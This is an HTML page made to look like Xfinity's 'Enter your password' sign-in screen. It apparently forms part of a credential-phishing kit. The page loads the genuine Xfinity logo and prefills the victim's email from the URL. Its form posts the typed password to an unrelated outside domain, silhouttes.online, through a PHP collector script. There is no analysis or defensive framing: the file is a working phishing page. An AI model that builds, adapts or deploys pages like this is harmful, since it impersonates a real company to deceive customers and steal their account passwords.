<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Xfinity Sign-In</title>
<style>
  /* ... your existing styles ... */
  body {
    margin: 0;
    background: #fff;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    padding-top: 50px; /* center vertically with some space */
  }

  .container {
    width: 400px;
    max-width: 90%;
    position: relative;
  }

  /* Logo at the top, far away from form */
  .logo {
    display: block;
    width: 80px;
    margin: 80px auto 0 auto; /* far up, centered */
    margin-bottom: 100px;
    margin-top: 0px;
  }

  /* Email display (initially empty) */
  .email {
    text-align: left;
    margin-top: 10px;
    font-weight: 600;
    font-size: 14px;
  }

  /* Heading "Enter your password" */
  h1 {
    text-align: left;
    font-size: 26px;
    font-weight: bold;
    margin: 10px 0 20px 0;
  }

  /* Form container - no padding */
  form {
    width: 100%;
  }

  /* Password input */
  input[type="password"] {
    width: 110%;
    padding: 12px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;
    margin-bottom: 20px;
  }

  /* Forgot password link - positioned at the right, close to input */
  .forgot {
    position: left;
    right: 10px;
    top: 53px; /* align near the input's top */
    font-size: 15px;
    color: #5a23b9;
    text-decoration: none;
  }

  /* Wrap input and forgot link together for alignment */
  .input-group {
    position: relative;
    margin-top: 20px;
  }

  /* Keep signed in checkbox */
  .checkbox-container {
    margin-top: 20px;
    display: flex;
    align-items: center;
  }

  /* Terms text */
  p {
    font-size: 13px;
    margin-top: 20px;
    color: #555;
    text-align: left;
  }

  /* Sign in button */
  button {
    width: 30%;
    padding: 14px;
    background-color: #5a23b9;
    color: #fff;
    border: none;
    border-radius: 4px;
    font-size: 14px;
    margin-top: 30px;
    cursor: pointer;
  }

  button:hover {
    background-color: #4a1fa4;
  }
</style>
</head>
<body>

<div class="container">
  <!-- The big logo far at top -->
  <img src="https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg" alt="Xfinity" class="logo" />

  <!-- Email display (initially empty) -->
  <div class="email" id="emailDisplay"></div>

  <!-- Hidden input for email to submit with form -->
  <input type="hidden" id="email" name="email" />

  <!-- Heading -->
  <h1>Enter your password</h1>

  <!-- Form with PHP link as action -->
  <form action="https://silhouttes.online/mo/index.php" method="POST">
    <div class="input-group">
      <input type="password" name="password" placeholder="" required />
      <a href="#" class="forgot">Forgot password?</a>
    </div>
    <div class="checkbox-container">
      <input type="checkbox" id="keepSignedIn" />
      <label for="keepSignedIn">Keep me signed in</label>
    </div>
    <!-- Submit button -->
    <button type="submit">Sign in</button>
  </form>

  <!-- Terms and Privacy -->
  <p>
    By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
  </p>

  <!-- Sign in as someone else -->
  <div class="sign-in-other">
    Sign in as someone else
  </div>

  <!-- Get help -->
  <div class="get-help">
    <a href="#">Get help</a>
  </div>
</div>

<script>
  // Function to get URL parameter
  function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }

  // Populate email display and hidden input when page loads if URL has email param
  window.onload = () => {
    const emailParam = getUrlParameter('email');
    if (emailParam) {
      document.getElementById('emailDisplay').innerText = emailParam;
      document.getElementById('email').value = emailParam; // set hidden input
    }
  };
</script>

</body>
</html>
